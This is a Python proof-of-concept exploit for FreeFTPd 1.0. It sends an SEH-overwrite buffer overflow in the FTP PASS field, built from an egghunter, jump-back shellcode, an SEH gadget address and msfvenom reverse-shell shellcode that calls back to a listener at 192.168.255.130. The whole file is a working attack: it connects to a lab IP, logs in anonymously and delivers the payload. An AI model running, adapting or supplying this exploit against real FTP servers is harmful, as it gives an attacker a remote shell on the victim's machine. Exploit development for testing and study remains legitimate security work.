#!/usr/bin/python3
# POC for FreeFTPd 1.0

import socket
import struct
import subprocess
import time

target_ip = "192.168.255.140"
target_port = 21

def make_string(offset):
    # NSEH offset is 797
    # bad chars: \x00\x0a
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.255.130 LPORT=1234 -f python -b "\x00\x0a"
    buf =  b"w00tw00t"
    buf += b"\xd9\xf7\xb8\x73\xa7\xdd\x82\xd9\x74\x24\xf4\x5a\x29"
    buf += b"\xc9\xb1\x52\x31\x42\x17\x03\x42\x17\x83\x99\x5b\x3f"
    buf += b"\x77\xa1\x4c\x42\x78\x59\x8d\x23\xf0\xbc\xbc\x63\x66"
    buf += b"\xb5\xef\x53\xec\x9b\x03\x1f\xa0\x0f\x97\x6d\x6d\x20"
    buf += b"\x10\xdb\x4b\x0f\xa1\x70\xaf\x0e\x21\x8b\xfc\xf0\x18"
    buf += b"\x44\xf1\xf1\x5d\xb9\xf8\xa3\x36\xb5\xaf\x53\x32\x83"
    buf += b"\x73\xd8\x08\x05\xf4\x3d\xd8\x24\xd5\x90\x52\x7f\xf5"
    buf += b"\x13\xb6\x0b\xbc\x0b\xdb\x36\x76\xa0\x2f\xcc\x89\x60"
    buf += b"\x7e\x2d\x25\x4d\x4e\xdc\x37\x8a\x69\x3f\x42\xe2\x89"
    buf += b"\xc2\x55\x31\xf3\x18\xd3\xa1\x53\xea\x43\x0d\x65\x3f"
    buf += b"\x15\xc6\x69\xf4\x51\x80\x6d\x0b\xb5\xbb\x8a\x80\x38"
    buf += b"\x6b\x1b\xd2\x1e\xaf\x47\x80\x3f\xf6\x2d\x67\x3f\xe8"
    buf += b"\x8d\xd8\xe5\x63\x23\x0c\x94\x2e\x2c\xe1\x95\xd0\xac"
    buf += b"\x6d\xad\xa3\x9e\x32\x05\x2b\x93\xbb\x83\xac\xd4\x91"
    buf += b"\x74\x22\x2b\x1a\x85\x6b\xe8\x4e\xd5\x03\xd9\xee\xbe"
    buf += b"\xd3\xe6\x3a\x10\x83\x48\x95\xd1\x73\x29\x45\xba\x99"
    buf += b"\xa6\xba\xda\xa2\x6c\xd3\x71\x59\xe7\x1c\x2d\x9e\x75"
    buf += b"\xf4\x2c\x60\x7e\xd7\xb8\x86\x14\xc7\xec\x11\x81\x7e"
    buf += b"\xb5\xe9\x30\x7e\x63\x94\x73\xf4\x80\x69\x3d\xfd\xed"
    buf += b"\x79\xaa\x0d\xb8\x23\x7d\x11\x16\x4b\xe1\x80\xfd\x8b"
    buf += b"\x6c\xb9\xa9\xdc\x39\x0f\xa0\x88\xd7\x36\x1a\xae\x25"
    buf += b"\xae\x65\x6a\xf2\x13\x6b\x73\x77\x2f\x4f\x63\x41\xb0"
    buf += b"\xcb\xd7\x1d\xe7\x85\x81\xdb\x51\x64\x7b\xb2\x0e\x2e"
    buf += b"\xeb\x43\x7d\xf1\x6d\x4c\xa8\x87\x91\xfd\x05\xde\xae"
    buf += b"\x32\xc2\xd6\xd7\x2e\x72\x18\x02\xeb\x82\x53\x0e\x5a"
    buf += b"\x0b\x3a\xdb\xde\x56\xbd\x36\x1c\x6f\x3e\xb2\xdd\x94"
    buf += b"\x5e\xb7\xd8\xd1\xd8\x24\x91\x4a\x8d\x4a\x06\x6a\x84"
    # jumps back to egghunter at beginning of buffer
    jmpback = b"\x54\x58\x2D\x80\x80\x80\x80\x2D\x70\x7B\x7F\x7F\xFF\xE0"
    # !mona egg
    egghunter = b"\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    # jumps back 21 bytes to jmpback
    nseh = b"\x41\xeb\xeb\x42"
    # 0x00414226 found in FreeFTPServer.exe
    seh = struct.pack("<I", 0x00414226)
    # buffer located after null byte, but still found in memory
    junk = egghunter + b"A"*(offset - len(egghunter) - len(jmpback)) + jmpback + nseh + seh + buf + b"D"*(1000 - len(buf))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    time.sleep(1)
    response = s.recv(2048)
    print(response.decode())
    user_string = b"USER anonymous\r\n"
    time.sleep(1)
    s.send(user_string)
    response = s.recv(2048)
    print(response.decode())
    pass_string = b"PASS " + junk.strip() + b"\r\n"
    time.sleep(1)
    s.send(pass_string)
    response=s.recv(2048)
    print(response.decode())
    s.close()

def main():
    offset = 797
    crash_string = make_string(offset)
    #exploit(crash_string)

if __name__ == "__main__":
    main()
